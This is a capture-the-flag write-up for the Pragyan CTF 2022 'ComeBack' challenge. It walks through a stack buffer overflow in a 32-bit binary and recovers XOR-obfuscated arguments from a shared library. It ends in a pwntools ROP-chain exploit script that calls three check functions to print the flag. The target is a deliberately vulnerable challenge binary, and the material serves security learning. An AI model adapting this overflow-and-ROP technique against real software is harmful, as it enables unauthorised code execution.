# Pragyan CTF 2022: ComeBack
## Write-Up

1) It is a ROP challenge. Inspect the binary using radare2.

``` r2 vuln ``` followed by ```aaaa``` and ```afl``` to analyze the functions.

2) In the new_main function, a buffer of 0x20 is created but the input reads in 0x200, for a possible buffer overflow.

3) Now to find the junk to break into stack, you can use gdb or an extension of gdb called gef to find it.

``` pattern create 60``` followed by ```r``` to run the program and input the buffer created.

In this way, pattern offset can be found.

4) You would notice three functions tryOne, tryTwo, tryThree. These functions are built in libvuln.so. So to find the arguments to be passed to these functions, inspect libvuln.so using radare2.

To find parameters to be passed to tryOne function, ``` pdf @ sym.tryOne``` and you will find the parameters being checked in a cmp.

5) To pass values to function, a gadget must be used. Since three arguments are passed, ```pop esi ; pop edi ; pop ebp ; ret``` should do.
The gadget address can be found using radare2 or using a tool called ROPgadget, ``` ROPgadget --binary vuln --ropchain | grep ": pop esi ; pop edi ; pop ebp ; ret" ```

6) The parameters of the function is checked with the XOR encrypted strings but the parameters are taken in int datatype which hints that the parameters might be hex. The __encrypt() function is called in strcmp() function. Now to get the decrypted function parameters, we can run

```
def encryptDecrypt(inpString):
    xorKey = "3T5*)Z'0B6";
    length = len(inpString);

    for i in range(length):
     
        inpString = (inpString[:i] +
             chr(ord(inpString[i]) ^ ord(xorKey[i])) +
                     inpString[i + 1:]);
        print(inpString[i], end = "");
     
    return inpString;
 

if __name__ == '__main__':
    encryptedArg = ""; # Input the encrypted argument
 
    # Encrypt the string
    print("Parameter: ", end = "");
    encryptedArg = encryptDecrypt(encryptedArg);
```

XORkey can be found in radare2 by disassembling the function __encrypt() using ```pdf @ sym.__encrypt``` and address where XOR key is stored can be found. Run the above script for 3 different variables to get the parameters. These are variables in the global scope of libvuln.so file. The parameters' offset can be found in disassembly of each tryOne, tryTwo and tryThree and their addresses. The varaiables' name can be determined in gdb using command ```info variables``` and its address. The variable names are check_p1, check_p2, check_p3.  

Create a header file named ```libxyz.h```. Add the following lines to it-

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

extern char check_p1[];
extern char check_p2[];
extern char check_p3[];
```
Now create another file try.c and add the following lines to it-

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>
#include "libxyz.h"

int main(){
    FILE *fptr;
    fptr = fopen("params.dat","wb");
    fprintf(fptr,"%s\n",check_p1);
    fprintf(fptr,"%s\n",check_p2);
    fprintf(fptr,"%s\n",check_p3);
    fclose(fptr);
    return 0;
}
```

Compile the file with ```gcc -m32 -fno-stack-protector -no-pie -o new_vuln try.c libvuln.so -Wl,-rpath=./``` and run ```./new_vuln```

The respective variable values are stored in the file ```params.dat```.

7) Now a chain can be build. Exploit :-

```
from pwn import *

import struct

binary = context.binary = ELF('./vuln')
gadget = struct.pack("I", 0x080493d1) # pop esi ; pop edi ; pop ebp ; ret
buf  = b"A" * 52
buf += gadget
buf += struct.pack("I", 0xdeadbeef)
buf += struct.pack("I", 0xf00dcafe)
buf += struct.pack("I", 0xd00dface)
buf += p32(binary.sym.tryOne-4) # tryOne()
buf += gadget
buf += struct.pack("I", 0xdeadbeef)
buf += struct.pack("I", 0xf00dcafe)
buf += struct.pack("I", 0xd00dface)
buf += p32(binary.sym.tryTwo-4) # tryTwo()
buf += gadget
buf += struct.pack("I", 0xf00dcafe)
buf += struct.pack("I", 0xd00dface)
buf += struct.pack("I", 0xdeadbeef)
buf += p32(binary.sym.tryThree-4) # tryThree()
buf += gadget
buf += struct.pack("I", 0xd00dface)
buf += struct.pack("I", 0xdeadbeef)
buf += struct.pack("I", 0xf00dcafe)

with open('exp', 'wb') as exp:
    exp.write(buf)
```
8) Running ``` ./vuln < exp ```, will print out the flag.
